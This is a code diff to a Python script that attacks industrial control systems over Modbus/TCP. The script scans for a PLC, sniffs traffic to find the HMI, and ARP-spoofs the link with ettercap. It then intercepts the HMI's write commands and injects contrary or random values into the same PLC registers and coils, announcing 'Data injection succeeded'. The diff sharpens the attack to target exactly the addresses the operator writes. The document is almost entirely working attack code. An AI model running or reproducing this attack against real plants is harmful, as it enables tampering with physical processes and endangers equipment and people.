@@ -4,27 +4,25 @@ from time import *
 from scapy.all import *
 from random import *
 import os, nmap
+from scapy.contrib import modbus
+
 
 #start = time.perf_counter()
 #plc = mt.TcpMaster('10.55.0.6', 502)
 plc_ip = ''
 hmi_ip = ''
 
-def changeData_reg(plc):
+def changeData_reg(plc, addr, val):
         plc = mt.TcpMaster(plc, 502)
-        i = randrange(1, 4)
-        q = randrange(1, 500)
-        plc.execute(slave=1, function_code=(md.WRITE_MULTIPLE_REGISTERS), starting_address=i, quantity_of_x=1, output_value=[q])
+        plc.execute(slave=1, function_code=(md.WRITE_MULTIPLE_REGISTERS), starting_address=addr, quantity_of_x=1, output_value=[val])
 
-def changeData0(plc):
+def changeData0(plc, addr):
         plc = mt.TcpMaster(plc, 502)
-        i = randrange(7, 18)
-        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=0)
+        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=addr, quantity_of_x=1, output_value=0)
 
-def changeData1(plc):
+def changeData1(plc, addr):
         plc = mt.TcpMaster(plc, 502)
-        i = randrange(7, 18)
-        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=1)
+        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=addr, quantity_of_x=1, output_value=1)
 
 def scan():
         nm = nmap.PortScanner()
@@ -38,7 +36,7 @@ def scan():
                 print("PLC IP : {}".format(plc_ip))
 
 def psniff(plcip):
-        fil = "dst host {} and tcp[tcpflags] & tcp-push != 0".format(plcip)
+        fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
         p = sniff(iface="eth0", count=1, filter=fil)
         x = p[0]
         global hmi_ip
@@ -54,7 +52,7 @@ def get_ip():
         sleep(1)
 
 def arp_spoofing():
-        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{plc}// /{hmi}// >/dev/null 2>&1 &'.format(plc=plc_ip, hmi=hmi_ip)
+        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
         os.system(arp2)
         process = os.popen('pgrep -f ettercap')
         out = process.read()
@@ -67,26 +65,30 @@ def cap():
         while True:
                 xx = 1
                 while xx:
-                        pp = "dst host {} and tcp[tcpflags] & tcp-push != 0".format(plc_ip)
+                        pp = "dst host {} and tcp[13] = 0x18".format(plc_ip)
                         plc_frames = sniff(iface="eth0", count=1, filter=pp)
                         modbus_query = plc_frames[0]
-                        st = str(modbus_query[Raw].load)
                         try:
-                                if "\\x01\\x10\\x00" in st:
-                                        changeData_reg(plc_ip)
+                                if modbus_query.funcCode == 16:
+                                        addr1 = modbus_query.startAddr
+                                        val1 = randrange(100, 10000)
+                                        changeData_reg(plc_ip, addr1, val1)
                                         xx = 0
                                         print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                         print("\033[1;36m{}\033[0m".format(modbus_query.show()))
-                                elif st[-9: -1] == "\\xff\\x00":
-                                        changeData0(plc_ip)
-                                        xx = 0
-                                        print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
-                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
-                                elif st[-9: -1] == "\\x00\\x00":
-                                        changeData1(plc_ip)
-                                        xx = 0
-                                        print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
-                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
+                                elif modbus_query.funcCode == 5:
+                                        if modbus_query.outputValue == 65280:
+                                                addr2 = modbus_query.outputAddr
+                                                changeData0(plc_ip, addr2)
+                                                xx = 0
+                                                print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
+                                                print("\033[1;36m{}\033[0m".format(modbus_query.show()))
+                                        elif modbus_query.outputValue == 0:
+                                                addr3 = modbus_query.outputAddr
+                                                changeData1(plc_ip, addr3)
+                                                xx = 0
+                                                print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
+                                                print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                         except:
                                 xx = 1
 
